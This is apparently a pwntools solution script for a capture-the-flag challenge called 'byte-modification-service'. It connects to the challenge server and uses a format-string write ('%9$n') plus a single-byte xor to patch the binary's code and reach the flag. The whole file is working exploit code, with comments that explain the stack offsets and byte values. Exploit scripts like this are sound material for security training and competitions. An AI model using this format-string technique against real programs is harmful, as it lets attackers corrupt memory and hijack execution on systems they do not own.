#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context(terminal=['tmux','new-window'])

exe = context.binary = ELF(args.EXE or './chall')

host = args.HOST or 'byte-modification-service.challs.csc.tf'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# gdbscript = '''
# b vuln
# b *vuln+313
# b *0x40148d
# b win
# continue
# '''.format(**locals())

gdbscript = '''
b *vuln+313
b *bye+28
continue
'''.format(**locals())

# -- Exploit goes here --

instruction = asm('ret 0x8') # necessary to align the stack

# we control the stack address where the value to xor has been copied, which is the 9th parameter
# one 0x0a byte is written before, so we have to subtract one from what we write
what = unpack(instruction, 24) - 1
payload = f'%{what}c%9$n@'.encode()

io = start()

# stack position to get to a stack address containing 0x401130
io.sendline(b'39')
# byte index to xor, in this case the 1st byte
io.sendline(b'0')
# byte to xor there, we want to xor something with 0x30 to get 0x20: `0x30^0x20 == 16`
io.sendline(b'16')

io.recvuntil(b'improve our service.\n')

io.sendline(payload)
try:
    io.recvuntil(b'goodbye.\n')
    flag = io.recvline()
    print(flag.decode())
except:
    pass
